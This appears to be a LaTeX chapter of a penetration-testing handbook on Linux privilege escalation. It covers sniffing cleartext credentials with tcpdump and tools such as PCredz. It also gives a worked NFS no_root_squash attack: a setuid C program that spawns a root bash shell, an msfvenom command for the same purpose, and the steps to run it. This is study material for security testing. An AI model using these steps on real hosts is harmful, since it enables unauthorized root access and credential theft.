\chapter{Privilege Escalation}
\label{chapter:linux-pe}
\input{linux/pe/kernel}
\input{linux/pe/scheduled}
\input{linux/pe/abuse_elevation}
\input{linux/pe/abuse_groups}

\section{Misc}

\subsection{Passive Traffic Capture}

If \verb+tcpdump+ is installed, unprivileged users may be able to capture
network traffic, including, in some cases, credentials passed in cleartext.
Several tools exist, such as
\href{https://github.com/DanMcInerney/net-creds}{net-creds} and
\href{https://github.com/lgandx/PCredz}{PCredz} that can be used to examine
data being passed on the wire. This may result in capturing sensitive
information such as credit card numbers and SNMP community strings. It may also
be possible to capture Net-NTLMv2, SMBv2, or Kerberos hashes, which could be
subjected to an offline brute force attack to reveal the plaintext password.
Cleartext protocols such as HTTP, FTP, POP, IMAP, telnet, or SMTP may contain
credentials that could be reused to escalate privileges on the host.


\subsection{Weak NFS permissions}
Files created via NFS inherit the remote user's ID. If the user is \verb+root+,
and \verb+root squashing+ is enabled, the ID will instead be set to the
\verb+nobody+ user.

Check the NFS share configuration: \verb+cat /etc/exports+ to see if an export
contains the \verb+no_root_squash+ option

on the attacker box mount the exported folder, craft a a malicious payload for
example:
\begin{verbatim}
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
\end{verbatim}

or more simply 
\begin{verbatim}
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
\end{verbatim}

copy as {\bf root} the binary on the mounted folder and set the \verb+suid-bit+
(\verb+chmod u+s+).

the go back on the target and execute the binary

\subsection{Hijacking Tmux sessions}
